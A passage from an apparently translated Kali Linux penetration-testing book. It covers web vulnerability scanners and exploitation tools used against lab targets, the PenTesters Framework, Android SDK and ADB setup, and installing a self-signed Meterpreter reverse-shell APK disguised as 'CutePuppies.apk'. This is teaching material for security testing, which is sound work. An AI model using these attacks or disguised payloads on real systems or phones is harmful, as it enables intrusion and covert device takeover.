  \ 本地与远程文件包含以及远程命令漏洞扫描器。这是一个“瑞士军刀”类型的工具，因为它可以识别目标服务器指纹、扫描文件和目录、加载多个插件、爬取网页页面，然后测试目标的漏洞和其他有趣信息。插件极大地扩展了程序的能力，从收集电子邮件地址到扫描备份文件的漏洞等。\n\
  \n该工具运行需要一些时间，特别是在测试较大的网站时。\n\n**Uniscan - 命令行基本用法**：\n\n 输入，`uniscan -u http://[IP\
  \ Address]/ -qweds`\n\n![](img/image00948.jpeg)\n\n**Uniscan - GUI 基本用法**：\n\n\
  \ 在终端中输入 `uniscan-gui`\n\n 输入要扫描的 URL 主机\n\n 勾选你想要的选项框\n\n 点击，`Start scan`（开始扫描）\n\
  \n![](img/image00949.jpeg)\n\n![](img/image00917.jpeg)\n\n## Vega\n\n**概述**：免费开源的\
  \ Web 应用安全测试器\n\n**工具作者**: Subgraph\n\n**工具网站**: [`subgraph.com/vega/`](https://subgraph.com/vega/)\n\
  \n![](img/image00950.jpeg)\n\nVega 是一个 Web 应用漏洞扫描器和代理。\n\n**运行简单扫描**：\n\n 输入，`vega`\
  \ 启动程序\n\n 在 `Window > Preferences` 下编辑扫描深度偏好\n\n 然后 `Scan > Start New Scan`（开始新扫描）\n\
  \n 输入目标 URL（你的 Metasploitable 虚拟机 IP 地址）\n\n 选择你希望扫描器使用的模块\n\n 开始扫描\n\n**执行身份验证扫描**：\n\
  \n 查看身份：[`subgraph.com/vega/documentation/Identities/index.en.html`](https://subgraph.com/vega/documentation/Identities/index.en.html)\n\
  \n发现的漏洞按严重程度编码。扫描完成后，你可以查看每个问题的详情，以及示例和修复建议：\n\n![](img/image00951.jpeg)\n\n![](img/image00917.jpeg)\n\
  \n## W3af\n\n**概述**：Web 应用攻击与审计框架\n\n**工具作者**: Andres Riancho 和 w3af 团队。\n\n**工具网站**:\
  \ [`w3af.org/`](http://w3af.org/)\n\n![](img/image00952.jpeg)\n\nW3af 是一个令人印象深刻的工具，可以扫描许多漏洞。它还可以作为一个攻击平台，运行爆破解和\
  \ SQL 注入等攻击。在本文写作时，该工具在 Kali 2 中运行时似乎会锁定。\n\n**基本用法**：\n\n 输入，`w3af` 启动\n\n 选择\
  \ `OWASP_TOP10`（或另一个配置）\n\n 输入目标 URL\n\n 点击 `Start Scan`（开始扫描）按钮。\n\nW3af 将开始扫描页面漏洞。\n\
  \n 点击 `Log` 菜单标签页查看当前进程。\n\n 点击 `Results`（结果）查看深度风险颜色标记扫描结果：\n\n![](img/image00953.jpeg)\n\
  \n 点击 `Exploit`（利用）标签页\n\n你会在左侧看到利用列表，中间窗口会有许多可能的漏洞页面。\n\n 点击 `Local_File_reader`\
  \ 或其他利用程序。\n\n如果存在可能的漏洞，中间窗口会高亮显示。注意当你点击 `Local_File_reader` 时，中间窗口中的 `Local file\
  \ inclusion vulnerability` 项会被高亮。\n\n要查看利用是否有效：\n\n 将左侧的利用程序拖动到中间窗口的漏洞上：\n\n![](img/image00954.jpeg)\n\
  \n如果有效，你将在右窗口获得一个 shell：\n\n![](img/image00955.jpeg)\n\n如果不有效，只需尝试另一种组合。你也可以通过点击中间窗口中的一个对象并点击\
  \ `Add` 来手动尝试利用。\n\n当你拥有 shell 时，双击它查看可用命令列表。然后使用 `lsp` 和 `payload` 命令列出并执行负载。这里是\
  \ `payload users` 命令的示例：\n\n![](img/image00956.jpeg)\n\n![](img/image00917.jpeg)\n\
  \n### WebScarab\n\n\n\n\n\n# 概述：中间人渗透测试/编码工具\n\n工具作者：`OWASP`\n\n工具官方网站：[`www.owasp.org/index.php/Category:OWASP_WebScarab_Project`](https://www.owasp.org/index.php/Category:OWASP_WebScarab_Project)\n\
  \n![](img/image00957.jpeg)\n\n`WebScarab` 是一个为开发者和安全测试人员设计的拦截型中间人代理。尽管它仍然有用，但在 OWASP\
  \ 网站上已被标记为不再维护，并被 `OWASP ZAP` 所代。\n\n1. 要启动 `WebScarab`，在终端中输入 `webscarab`。\n2.\
  \ 查看代理设置 - 点击 `Proxy` 标签，然后点击 `Listeners`。\n3. 配置 `Iceweasel` 使用此代理。\n4. 访问 `Mutillidae`\
  \ 网页并登录（`admin/ adminpass`）。\n5. 点击 `Summary` 标签查看概览：\n\n![](img/image00958.jpeg)\n\
  6. 右点击其中一条主机行（如上所示高亮），然后点击 `show Conversation`（显示对话）。\n7. 在顶部和底部窗口中均点击 `Raw`：\n\n\
  ![](img/image00959.jpeg)\n\n这将为你提供发送请求和响应的良好 HTML 视图。如果你回到代理设置，在 Manual Edit（手动编辑）下点击\
  \ `Intercept Requests`（拦截请求）和 `Intercept Responses`（拦截响应），你就可以像使用 `Burp Suites Intercepting\
  \ Proxy` 那样拦截并修改输入的页面值：\n\n![](img/image00960.jpeg)\n\n`WebScarab` 还内置了一个非常好 XSS/\
  \ CRLF 漏洞测试器。\n\n8. 点击 `XSS/CRLF` 菜单标签：\n\n![](img/image00961.jpeg)\n\n注意 `WebScarab`\
  \ 自动发现了登录页面可能存在 XSS/CRLF 漏洞！\n9. 要进行验证，点击 `Suspected Vulnerabilities`（怀疑漏洞）之一进行选择，然后点击页面底部的\
  \ `Check` 按钮：\n\n![](img/image00962.jpeg)\n\n注意登录页面现在列在已确认的 Vulnerabilities（已确认漏洞）下。\n\
  \n这只是 `WebScarab` 某些功能的简要概述。你可能想更仔细地查看此工具，或者 OWASP 更新的工具，特别是如果你也是开发者。完成后不要忘记将 `Iceweasel`\
  \ 网络代理设置改回默认。\n\n![](img/image00917.jpeg)\n\n## Webshag\n\n概述：Web 服务器审计工具\n\n工具作者：`SCRT\
  \ Information Security`\n\n工具官方网站：[`www.scrt.ch/en/attack/downloads/webshag`](http://www.scrt.ch/en/attack/downloads/webshag)\n\
  \n![](img/image00963.jpeg)\n\n`Webshag` 是一个多线程 Web 服务器审计工具，用于爬取、扫描或模糊网站。该工具存在于原始\
  \ Kali 中，但似乎在 Kali 2 中被移除了。\n\n### 基础用法：\n\n- 输入 `webshag-gui` 启动\n- 点击标签页之一：`PSCAN`（端口扫描）、`INFO`、`SPIDER`、`USCAN`\
  \ 或 `FUZZ`\n- 输入目标网站 IP 地址\n 选择 选择所需的任何选项\n- 点击 `OK` 开始扫描\n\n`Webshag` 将自动对目标运行选定的函数并返回结果。\n\
  \n![](img/image00917.jpeg)\n\n## WebSlayer\n\n概述：Web 应用暴力破解和扫描器\n\n作者：`OWASP/ Edge-Security`\n\
  \n网站：[`www.owasp.org/index.php/Category:OWASP_Webslayer_Project`](https://www.owasp.org/index.php/Category:OWASP_Webslayer_Project)\n\
  \n![](img/image00964.jpeg)\n\n`WebSlayer` 被列为 OWASP “非活跃”（In-Active）项目，是一个 GUI Web\
  \ 应用暴力破解器、模糊器和扫描器。该工具存在于原始 Kali 中，但似乎在 Kali 2 中被移除了。\n\n以下是针对 `Mutillidae` 登录页面的\
  \ SQL 注入攻击示例：\n\n- 从菜单或在终端 `webslayer` 开始\n- 拦截登录请求（就像我们在 Burp 中做的那样）\n- 将请求中的 User\
  \ Agent 头信息粘贴到 `Headers` 中\n- 在 POST 数据中放入攻击字符串，将关键字（`username`）替换为 `FUZZ`。\n- 选择\
  \ `Dictionary` 作为有效负载类型\n- 从 `Dictionary` 下拉菜单中选择 `Injections/SQL.txt`\n- 点击 `Start!`\
  \ 开始攻击\n\n如下所示：\n\n![](img/image00965.jpeg)\n\n攻击完成后，点击 `Attack Results` 标签：\n\n\
  ![](img/image00966.jpeg)\n\n这将显示一个颜色编码的响应，说明哪些攻击成功了，哪些失败了。\n\n![](img/image00917.jpeg)\n\
  \n## WebSploit\n\n概述：`WebSploit` 是一个网站攻击框架，包含扫描和攻击模块。\n\n作者：`Fardin Allahverdinazhand\
  \ (0x0ptim0us)`\n\n网站：[`sourceforge.net/projects/websploit/`](http://sourceforge.net/projects/websploit/)\n\
  \n![](img/image00967.jpeg)\n\n工作原理与 `Metasploit` 非常相似，输入 `help` 查看命令。输入 `Show module`\
  \ 查看可用模块。当你找到你想尝试的模块后：\n\n- 简单使用 `use [module name]`\n- 输入 `show options`\n- 然后使用\
  \ `set [option] [value]` 设置选项\n\n让我们用 `PHPMyAdmin` 登录页面扫描模块测试一下。\n\n1. 输入 `use web/pma`\n\
  2. 然后输入 `show options`\n3. 最后，`set TARGET (输入你的 Metasploitable IP 地址)`\n4. 现在，`run`\
  \ 模块。\n\n`WebSploit` 快速返回：\n\n![](img/image00968.jpeg)\n\n在 `/phpMyAdmin/` 找到了 PHP\
  \ MyAdmin 页面。\n\n- 输入 `exit` 退出程序\n\n`WebSploit` 包括许多其他模块，包括 Wi-Fi 和网络攻击。\n\n![](img/image00917.jpeg)\n\
  \n## WhatWeb\n\n概述：网站识别扫描器\n\n作者：`Andrew Horton`\n\n网站：[`www.morningstarsecurity.com/research/whatweb`](http://www.morningstarsecurity.com/research/whatweb)\n\
  \n![](img/image00969.jpeg)\n\n`WhatWeb` 是一个非常快速网站识别扫描器，回答“那个网站是什么？”的问题。根据工具网站，它包含超过\
  \ 900 个插件，可以识别从版本号到 SQL 错误的服务。\n\n### 基础用法：\n\n- 输入 `whatweb [target website].com`\n\
  - 或输入 `whatweb -v [target website].com` 获取详细输出。\n\n![](img/image00970.jpeg)\n\n\
  ![](img/image00917.jpeg)\n\n## WPScan\n\n概述：WordPress 站点漏洞扫描器。\n\n工具作者：`WPScan Team\
  \ (@erwan_lr, pvdl, @_FireFart_ & @ethicalhack3r)`\n\n工具官方网站：[`sucuri.net`](https://sucuri.net)\n\
  \n![](img/image00971.jpeg)\n\n如果你在组织中安装了 WordPress，可以使用此扫描器。运行快速且非常有效。\n\n### 基础用法：\n\
  \n- `wpscan --url [Website Address].com`\n\n查看程序帮助屏幕获取完整说明和示例。\n\n![](img/image00917.jpeg)\n\
  \n## XSSer\n\n概述：GUI 和命令行 XSS 检测器/利用工具\n\n工具作者：`psy, epsylon`\n\n工具官方网站：[`xsser.sourceforge.net/`](http://xsser.sourceforge.net/)\n\
  \n![](img/image00972.jpeg)\n\n`XSSer` 是一个检测、报告和利用 XSS 漏洞的框架。\n\n- 命令行：`xsser --help`\n\
  - GUI 接口：`xsser --gtk`\n\n### 基础用法：\n\n- 启动 GUI，`xsser --gtk`\n- 点击 `Wizard Helper`\
  \ 菜单按钮\n- 点击 `Start Wizard Helper`\n\n按照向导操作：\n\n- 选择 #1，`I want to enter the URL`\n\
  - 为你的 Metasploitable VM 输入 IP 地址（例如 [`192.168.1.68`](http://192.168.1.68)）\n- 点击\
  \ `Next`\n- 选择 `I want to \"crawl\" all the links of the website of my target(s),\
  \ to search as much vulnerabilities as possible.`\n- 然后 `connect directly to target`\n\
  - 选择 `I want to inject XSS scripts without encoding.`\n- 最后，`I want to inject a\
  \ classic \"alert\" message box with a \"md5 Hash\" to certificate the vulnerability.`\n\
  \n你现在应该看到下面的屏幕：\n\n![](img/image00973.jpeg)\n\n现在，点击 `START Test!`\n\n完成后，你将得到一个列出所有可能的\
  \ XSS 漏洞页面的结果页：\n\n![](img/image00974.jpeg)\n\n![](img/image00917.jpeg)\n\n### The\
  \ PenTesters Framework\n\n工具创建：`Dave Kennedy (ReL1K)`\n\n工具网站：[`github.com/trustedsec/ptf`](https://github.com/trustedsec/ptf)\n\
  \n\n\n\n最后，渗透测试框架 (`PTF`) 是一个 Python 脚本，它包含了创建渗透测试环境所需的所有常用工具。该工具由 TrustedSec 首席执行官\
  \ David Kennedy 创建，他也了著名的“社会工程工具包”（Social Engineering Toolkit）。目前 `PTF` 未包含在 Kali\
  \ 2 发行版中，但可能会在以后添加。尽管该程序与 Kali Linux ，但它是一个独立的渗透测试环境，可以单独安装。不过某些人可能喜欢它自带的默认 Kali\
  \ 安装中未包含的工具。本书中的内容并不依赖于 `PTF` 中的独特工具，而且在 Kali 2 中运行它似乎存在一些细微错误。因此，我建议你在完成本书的教程之前**不要**安装它，或者将其安装在自己独立的\
  \ Kali 虚拟机中。我之所以包含它，是因为我想某些安全领域的人士可能想查看一下。创建一个自定义的渗透测试环境是非常实用的。\n\n该程序分为两个部分：\n\n\
  1. `PTF` 安装程序/管理器，用于安装或更新模块。\n2. 工作目录（`/pentest`），其中存放了所有供使用的工具。\n\n`PTF` 安装会将你选择的工具添加到配置文件指定的目录中。一旦从\
  \ `PTF` 工具安装了工具，你就可以从安装目录（`/pentest`）或通过命令行提示符运行程序来访问它们。\n\n## 安装所有 PTF 模块\n\n安装程序的设置运行方式类似于\
  \ Metasploit，其组织结构反映了渗透测试执行标准 (PTES)，只需如下所示将框架 git clone 到 Kali 即可。这是一个新工具，在写本文时，它似乎似乎存在一些错误。我知道这些问题会随着时间得到解决，在此之前，我强烈建议只安装你需要的模块（在下一节中解释），以减少对你\
  \ Kali 安装的干扰风险。\n\n要安装所有模块：\n\n- `git clone https://github.com/trustedsec/ptf`\n\
  \n![](img/image00975.jpeg)\n\n- 接下来检查 `./ptf/config/ptf.config` 设置：\n\n![](img/image00976.jpeg)\n\
  \n基础安装路径“/pentest”是所有模块将安装的地方。\n\n现在输入以下内容：\n\n- `./ptf`\n- `use modules/install_update_all`\n\
  \n这会启动 `PTF`，接下来的命令将下载并安装所有模块和更新；如果你只想安装某些模块，请参见下一节。在模块安装期间，你会被多次提示输入，请按照提示操作。这可能需要很长时间（在虚拟机上可能需要几个小时）。完成后，你应该看到这个：\n\
  \n![](img/image00977.jpeg)\n\n## 安装/更新单个模块\n\n要在 `PTF` 中安装某些或所有攻击模块：\n\n- 在 `ptf>`\
  \ 提示符下输入“help”：\n\n主提示符可用：`show modules`, `show <module>`, `search <name>`, `use\
  \ <module>`\n模块内部：`show options`, `set <option>`, `run`\n其他命令：`back`, `help`, `?`,\
  \ `exit`, `quit`\n更新或安装：`update`, `upgrade`, `install`\n\n`PTF` 的功能用法与 Metasploit\
  \ 一样，你选择一个你想要安装或更新的模块，设置选项并运行。\n\n- 输入“show modules”\n\n![](img/image00978.jpeg)\n\
  \n- 使用“use”命令选择你想要的模块。\n- 例如，新的“Unicorn” PowerShell 攻击工具。\n- 使用“show options”显示选项：\n\
  \n![](img/image00979.jpeg)\n\n- 然后输入“run”来安装或更新工具：\n\n![](img/image00980.jpeg)\n\
  \n退出程序，然后运行你想要的工具：\n\n![](img/image00981.jpeg)\n\n正如在写本文时提到的，它与 Kali 2 之间似乎存在细微问题，但随着时间的推移，我认为这可能是\
  \ Kali 以及任何渗透测试者工具箱的一个有趣的补充。\n\n## Web 应用渗透测试总结\n\n在本节中，我们介绍了 Kali 自带的许多 Web 应用安全工具，并了解了它们的基本用法。其中一些工具已经过时，但仍然可以使用，且了解哪些可用工具是有益的。希望你看到了一些以前没见过的新工具，并希望它们将成为你个人安全测试工具包的极佳补充。\n\
  \n这些只是 Web 应用安全测试的一些基本技术和工具。坦率地说，精通此事的唯一方法就是通过实践。基本上我在这里所做的涵盖了非常基础的 Web 应用安全，并向你展示了许多工具。发现哪些工具和技术对你最有效并使用它们。记住，仅仅因为某事在测试环境中有效并不意味着它在现实世界中会\
  \ 100% 有效。在一次测试中，我记得对一个系统进行扫描并发现了一个“绝对”漏洞的服务，结果利用程序根本无法运行，喜极悲生。此时你退后一步，重新评估其他可能性并再次尝试。在这种情况下，我通过发现一个受弱密码保护的服务获得了访问权限。\n\
  \n你需要了解几种不同的寻找漏洞的技术和方法。在简单难度上玩玩 Metasploitable。一旦你精通了这些，就提高安全级别再次尝试。注意哪些技术仍然有效，哪些无效。有许多“有漏洞”的虚拟机和安全学习网站供你练习和磨练技能，下载它们，大干做吧。你了解的“工具”越多，掌握的技术越丰富，成功的机会就越大。\n\
  \n在计划安全测试时，要记住你的目标。一个除了电子邮件外没有网络业务的小公司客户可能需要通过社会工程学、钓鱼、Wi-Fi 和可能的物理入侵尝试进行攻击。实体越大，通常入侵尝试的机会也越大。大公司可能会有更多面向公共设备。跳跃式思维。\n\
  \n多年来，我见过的完全开放的安全系统、建筑控制、IP 视频和音频系统。随着将万物上线的热潮（物联网）继续全猛地进行，这种情况只会增加。例如，我甚至见过大型的连接互联网的办公室鱼缸控制系统完全向外界开放。由于几乎每个在线设备中都有一个\
  \ Linux 服务器，这种机会几乎是无限的。\n\n最后，如果你计划专业地渗透渗透，请务必确保你的入侵尝试范围（哪些是允许的，哪些是超出范围的）在书面合同中明确说明，并与客户口头解释并达成一致。\n\
  \n# 攻击智能设备\n\n## 第 26 章：安装 Android SDK 创建虚拟手机\n\n企业中的移动设备和平板电脑非常风靡。这被称为“BYOD”，或“自带设备”，这些移动设备的涌入为\
  \ IT 支持人员带来了完全不同的挑战。\n\n- 保护你的网络免受 BYOD 威胁\n- 数据安全与隐私\n- 需要支持的广泛新设备和型号\n- 加固和修补这些设备\n\
  \n这些只是企业和中小企业面临的少数担忧之一。由于 Android 是 BYOD 设备最流行的平台之一，在本节中，我们将介绍如何使用 Kali 连接到它们并进行一些基础的安全测试。\n\
  \n### 安装 Android SDK\n\n为了将 Android 设备连接到 Kali，我们需要安装 Android SDK。一旦安装，我们就能创建模拟的\
  \ Android 系统并与物理设备进行通信。要获取最新版本的 Android SDK，我们将从开发者网站下载。\n\n1. 在 Kali 中打开浏览器并访问：`https://developer.android.com/sdk/index.html`\n\
  2. 下载适用于 Linux 的最新 Android SDK 工具：\n\n![](img/image00982.jpeg)\n\n3. 接受条款和条件。\n\
  4. 然后不要保存文件，而是选择“用归档管理器打开文件”。\n\n\n\n\n\n5. 保持默认位置并点击“Extract”（提取）：\n\n![](img/image00983.jpeg)\n\
  \n6. 然后再次点击“Extract”（提取）。\n\n现在你的 kali 系统根目录下将有了一个 `android-sdk-linux` 目录。\n\n7.\
  \ `cd` 进入目录并使用 `ls` 查看文件：\n\n```\nroot@kali:~# cd android-sdk-linux/\nroot@kali:~/android-sdk-linux#\
  \ ls\n\nadd-ons  platforms  SDK Readme.txt  tools\n```\n\n如你所见，安装过程中了以下目录：\n- Add-ons（插件）\n\
  - Platforms（平台）\n- SDK\n- Tools（工具）\n\n就是这样；我们现在已经安装了 Android SDK。在标准安装中，Add-ons\
  \ 目录是空的。当我们使用 tools 目录下的 Android Manager 控制台添加新平台和功能时，情况将会发生变化。\n\n### 使用管理控制台\n\
  \n既然我们已经安装了 Android SDK，让我们来看几个功能。我们首先想要做的是启动 Android SDK Manager。这将允许我们获取 SDK 的任何更新，并在标准安装中安装新功能。\n\
  \n在此之前，让我们快速查看一下“tools”目录：\n\n![](img/image00984.jpeg)\n\n我们在这里关注的两个主要程序是 `android`（它是\
  \ Android SDK 管理器）以及 `emulator` 文件（32 位和 64 位），它们允许我们使用模拟器运行虚拟安卓设备。\n\n如果我们运行 `android`\
  \ 文件，它将启动器 GUI，或者我们可以提供命令行开关从命令提示符运行它。我们稍后会讨论，现在先来看如何从 GUI 运行：\n\n1. 进入 tools 目录，`cd\
  \ tools`\n2. 输入，`./android`\n3. GUI 将会打开：\n\n![](img/image00985.jpeg)\n\n你将在左侧看到一个可用包列表，右侧则显示它们的修订级别和状态。要添加或删除包，只需点击或取消点击名称旁边的复选框即可。\n\
  \nSDK 管理器通常会默认安装至少一个 API。但如下所示，有许多 Android 版本可供选择：\n\n![](img/image00986.jpeg)\n\
  \n如果你想尝试不同版本的 Android API（以及不同的智能手机模拟器），你只需要勾选想要安装的 Android 版本即可。\n\n![](img/image00987.jpeg)\n\
  \n### 安装不同的 Android 版本\n\n例如，让我们如下所示添加 4.0.3 版本和 2.2 版本：\n\n1. 选择“Android 4.0.3”和“Android\
  \ 2.2”：\n\n![](img/image00988.jpeg)\n\n2. 然后点击管理器右角的“Install X packages”按钮：\n\n\
  ![](img/image00989.jpeg)\n3. 点击“Accept License”（接受许可），然后点击“Install”（安装）\n\n管理器随后将更新并安装我们选择的新包。这可能需要一些时间，所以现在是去泡咖啡的好时候！当初始安装完成后，它可能会提示还有更多文件需要下载。重复接受许可并下载更新，直到全部安装完成，然后退出程序。\n\
  \n### 启动模拟器\n\n现在我们已经加载了几个 API（包括预装的和我们新添加的两个），让我们开始启动 Android 模拟器会话。\n\n1. 在终端输入，`export\
  \ ANDROID_EMULATOR_FORCE_32BIT=true`\n2. 在终端输入，`./android`\n\n![](img/image00990.jpeg)\n\
  \n3. 点击菜单中的“Tools”，然后点击“Manage AVDs…”（管理 AVD...）\n\n![](img/image00991.jpeg)\n4.\
  \ 在 Android Virtual Device (AVD) 器界面点击“Create”（创建）。这会弹出一个我们需要填充的 AVD 创建页面。\n\n![](img/image00992.jpeg)\n\
  \n1. 点击“AVD Name”字段并输入一个名称。我通常会在名称中包含 API 级别（例如 Android 4.0），这样你只需看 AVD 名称就能辨别它们。你可以输入任何内容，但现在我们使用\
  \ `Android_4.0.3`。\n2. 点击 Device 框中的双箭头，选择你想要运行的设备。有多个平板电脑和智能手机可以选择。选择“5.1” WVGA”。\n\
  3. 通过点击双箭头并从列表中选择，将 Target（目标）更改为“Android 4.0.3 – API Level 15”。\n4. 将 CPU/ABI 设置为\
  \ `ARM (armeabi-v7a)`。\n5. 将 Skin 框更改为“No Skin”（无皮肤）。\n6. **重要** - 将 VM Heap 更改为“32”。\n\
  7. 对于 Back Camera（后置摄像头），选择“emulated”（模拟）。\n8. 最后，将 SD 卡大小设置为 10 Mib。\n\n你的 AVD\
  \ 创建屏幕现在应该像这样：\n\n![](img/image00993.jpeg)\n\n9. 一旦设置好，只需点击“OK”创建 AVD。\n\nAVD 将被创建，你将看到像下面的状态屏幕：\n\
  \n![](img/image00994.jpeg)\n\n10. 点击“OK”，返回到 AVD Manager 界面。\n11. 现在点击我们创建的 AVD，然后点击“Start”（启动）：\n\
  \n![](img/image00995.jpeg)\n\n12. 在 Launch（启动）界面，只需点击“Launch”。\n\n![](img/image00996.jpeg)\n\
  \n等待一会儿，你将看到 Android 启动界面，然后屏幕上会出现一个模拟的安卓设备（第一次启动时，AVD 可能会留在“Android”加载界面很长时间）。你将看到欢迎界面：\n\
  \n![](img/image00997.jpeg)\n\n点击“OK”并按下应用按钮（底部正中）查看你所有的应用：\n\n![](img/image00998.jpeg)\n\
  \n\n\n\n\n10. 在弹出“USB 设备准备从主机上拔出...”警告时，点击“确定”。\n\n我们现在可以通过 USB 端口直接与 Android 设备通信。但首先，让我们确保\
  \ Android 管理器可以看到我们的设备。\n\n1. 进入你安装 Android SDK 的目录。\n2. 进入 `platform-tools` 目录。\n\
  \n![](img/image01007.jpeg)\n\n3. 运行 `./adb devices`：\n\n![](img/image01008.jpeg)\n\
  \n如果运行正常，你将看到你的手机列为已连接的设备。\n\n### 连接故障排除\n\n如果那里没有显示，你可以尝试以下几种方法：\n\n- 关闭 USB 调试，连接手机，然后重新开启\
  \ USB 调试。\n- 可能是 USB 线的问题。\n- 尝试使用 `./adb kill-server` 和 `./adb start-server` 停止并重启\
  \ ADB 服务。\n- 某些设备在作为 U 盘和 USB 调试模式运行时存在问题。检查你的设备说明查看如何关闭媒体共享。\n- 最后，可能是 USB 驱动程序问题（尤其是\
  \ Nexus 设备）。访问 Android 官网和 Google Android 论坛以获取更多信息。\n\n### 与设备通信\n\n你现在可以使用 Android\
  \ 调试桥 (ADB) 命令与设备或模拟器会话通信。ADB 允许你执行多种功能，包括向设备收发文件，以及安装和删除包。\n\n- 输入 `./adb help`\
  \ 查看可用命令列表：\n\n![](img/image01009.jpeg)\n\n你也可以访问 Android 开发者网站查看 ADB 帮助：[`developer.android.com/tools/help/adb.html`](http://developer.android.com/tools/help/adb.html)。\n\
  \n- 要启动远程终端，只需输入 `./adb shell`\n\n你现在可以像操作其他 Linux 远程 shell 一样直接向设备发布命令。例如，让我们运行\
  \ `ls` 命令：\n\n![](img/image01010.jpeg)\n\n如上图所示，我们确实连接到了设备（在本例中是一个 Android 智能手机），并能够列出目录。要退出远程会话，只需输入\
  \ `exit`。\n\n其他常用命令包括：\n\n- `adb push` - 将文件或目录复制到设备\n- `adb pull` - 从设备复制文件或目录\n\
  - `adb install` - 向设备复制并安装应用文件\n- `adb uninstall` - 从设备删除应用\n\n### 使用 ADB 连接到模拟的\
  \ Android 设备\n\n现在我们已经知道如何使用 `.adb` 命令了，可以在我们在章节开始时创建的一个模拟 Android 设备上运行它。只需在 AVD\
  \ 管理器中启动模拟的 Android 设备。在它运行时，打开第二个终端提示符并进入 android sdk `platform-tools` 目录。\n\n\
  你可以通过输入 `./adb devices` 查看设备\n\n并如下所示使用 `./adb shell` 连接到它：\n\n![](img/image01011.jpeg)\n\
  \n你现在可以使用 adb 直接与模拟设备进行交互！\n\n### 使用 ADB 安装应用\n\n你可以通过 ADB 向设备安装应用。这是安装安全工具或我们稍后将创建的\
  \ Meterpreter Msfvenom `.apk` shell 的快速方法。通常情况下，当 Android 设备连接到 Android SDK 时，安装应用最简单的方法是通过通过\
  \ `adb install [app_name.apk]` 命令：\n\n![](img/image01012.jpeg)\n\n这就完成了；应用已安装在 Android\
  \ 设备上并准备好使用。\n\n我之所以说“通常是最简单的方法”，是因为如果手机要求 `.apk` 文件经过证书签名，而你正尝试安装一个未签名的 Metasploit\
  \ shell，就会遇到问题。在某些设备上，你可以在安全设置中关闭“验证性证书”。但在其他设备上，未签名的应用将无法安装。\n\n例如，如果我们尝试在一个 AVD\
  \ 模拟 Android 设备上安装这个名为 `CutePuppies.apk` 的 Meterpreter Android 反向 Shell，将会得到此错误：\n\
  \n![](img/image01013.jpeg)\n\n“Failure [INSTALL_PARSE_FAILED_NO_CERTIFICATES]” -\
  \ Metasploit APK 文件未经过签名，因此 Android 设备无法确定应用的有效性且不会安装它。\n\n我们处于开发者模式，所以应该能够强制安装应用。我花费了大量时间研究这个问题，发现\
  \ Android SDK 显然没有安装“Android Developer”证书，而如果你使用完整的 Android Studio 或 Eclipse 项目管理程序，该证书似乎会被安装。\n\
  \n所以所有需要做的就是在你的 Kali 系统上创建 Android 开发者证书密钥，然后用开发者密钥对你的漏洞进行自签名！我不确定为什么 Google 没有在\
  \ SDK 中包含此功能。考虑到最近关于虚假证书的所有新闻，我不会在书中包含执行此操作的逐步说明。但我会说，这两个网站的论坛评论非常有帮助：其一是创建“Android\
  \ Debug”自签名证书，二是使用新创建的证书签名我们的 payload 应用：\n\n- [`stackoverflow.com/questions/2194808/debug-certificate-expired-error-in-eclipse-android-plugins/2196397#2196397`](http://stackoverflow.com/questions/2194808/debug-certificate-expired-error-in-eclipse-android-plugins/2196397#2196397)\n\
  - [`github.com/rapid7/metasploit-javapayload/issues/21`](https://github.com/rapid7/metasploit-javapayload/issues/21)\n\
  \n一旦 `CutePuppies.apk` Metasploit shell 完成自签名，它就能无问题地安装了：\n\n![](img/image01014.jpeg)\n\
  \n应用出现在模拟设备上。Metasploit Android Shell 被称为 `MainActivity`：\n\n![](img/image01015.jpeg)\n\
  \n运行时它会连接到我们的 Kali 系统并创建一个会话：\n\n![](img/image01016.jpeg)\n\n我们成功通过 ADB 安装了一个 Android\
  \ `.apk` shell 并通过 Kali 连接到它。我们将在接下来的章节介绍如何制作真正的 Meterpreter Android 反向 Shell 应用。我只想向你们展示如何通过\
  \ ADB 安装应用以及遇到问题该怎么办。\n\n## 第 27 章\n\n## Root 和 ADB 使用\n\nRoot 或者不 Root，这是一个问题。对设备\
  \ Root 用户用户“root”或管理员权限。在大多数智能手机和许多平板电脑上，用户不允许使用 root 权限。它被锁定了，为设备增加了额外的安全性。如果你没有\
  \ root 权限，设备的许多系统级、设置和安全区域对用户都是禁止的。有了 root 权限后，你可以访问、查看甚至修改这些区域。\n\n如果黑客访问了未 root\
  \ 的手机，他们能够访问的区域有限，这限制了你的损失和损害。黑客需要尝试权限提升攻击来试图获取你设备的 root 权限。\n\n如果黑客访问了已 root 的手机，他们基本上拥有了城堡的钥匙，能够访问设备上的大部分甚至全部数据和设置。这包括访问你的手机日志和短信。黑客还可能在你的设备上安装他自己的恶意软件充当远程间谍，或者更糟的是，利用你的设备攻击其他设备。\n\
  \n我不建议对你的设备进行 Root，特别是在 BYOD（自带设备）环境中。因此，我将不会展示如何 root 你的 Android。如果你理解风险并仍然想这样做，有许多教程和工具可用。在本节中，我们将学习如何连接到\
  \ Android 设备并查看只有在设备已 root 后才能访问的系统文件和数据库。我们看到为什么 root 你的智能设备不是一个好主意！由于我们已经安装了 Android\
  \ SDK，我将在本章中重点关注 Android。但通过不同的软件，你也可以在 Apple 设备上访问类似的数据库。\n\n### 什么是 Root？\n\n\n\
  \n\n\n智能设备出厂时未启用管理员访问权限。用户在受限权限环境中运行，这有助于保护系统免受安全威胁和用户误操作的影响。由于制造商通常不希望用户拥有管理员权限，因此根（rooting）通常包括下载修改过的\
  \ ROM 软件或运行允许您的设备获取 root 权限的特殊软件。\n\n首先是法律问题，在某些国家对某些设备进行根是非法的。其次是安全问题，允许设备获取 root\
  \ 权限会消除许多防御设备免受恶意攻击的内置安全机制——设备没有 root 权限是有原因的！你极可能会导致设备保修失效。最后，你可能会让设备“变砖”（翻译——把它变成一个昂贵的门挡石）。所以，如果你还在考虑这样做——别这样做。\n\
  \n好了，你下定决心要这样做。有时你确实需要设备的 root 权限——某些程序或特定应用程序需要它。或者你对某些修改过的 ROM 固件可以提供的速度提升感兴趣。有许多方法，有些非常简单，有些取决于设备需要许多步骤。再次，我不建议对您的设备进行根，如果你选择这样做，就必须承担所有风险。如果你仍然想继续，我只能说\
  \ Google 是你的朋友。\n\n下面是在 Android 设备上安装修改过的 ROM 的示例：\n\n![](img/image01017.jpeg)\n\
  \n## 查看受保护的数据库\n\n一旦你的设备被根，你将能够访问通常无法访问的保护系统数据库。我们将通过 USB 连接到 Android 设备并使用开发者模式来模拟这一。开发者模式允许你将\
  \ Android 设备连接到 Kali 上的 Android SDK 程序，并允许你在两者之间操作或传输数据。确保你的 Android 设备已启用开发者模式，并通过\
